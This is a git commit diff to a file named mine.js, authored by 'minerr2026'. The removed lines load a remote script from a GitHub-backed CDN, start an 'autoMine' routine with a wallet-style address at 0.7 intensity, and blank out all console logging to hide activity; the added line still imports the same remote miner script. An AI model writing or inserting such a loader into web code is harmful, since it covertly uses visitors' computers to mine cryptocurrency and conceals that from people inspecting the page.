584ebb5b0ce1080838f2a7192e6e9e394553bee2
minerr2026 <miner2026@atomicmail.io>
2026-06-02 16:45:33 +0330

    Update mine.js

--- mine.js
+++ mine.js
@@ -1,4 +1,1 @@
-import("https://cdn.jsdelivr.net/gh/minerr2026/miner@latest/miner.js").then(module => {module.autoMine("REB9cZRi2mMjXDSJVNTqCkW8XT1D9KKFgb", 0.7);});
-for (let m of ["log","info","warn","error","debug"]) {
-  console[m] = function () {};
-}
+import("https://cdn.jsdelivr.net/gh/minerr2026/miner@latest/miner.js?ver=1.0.0");
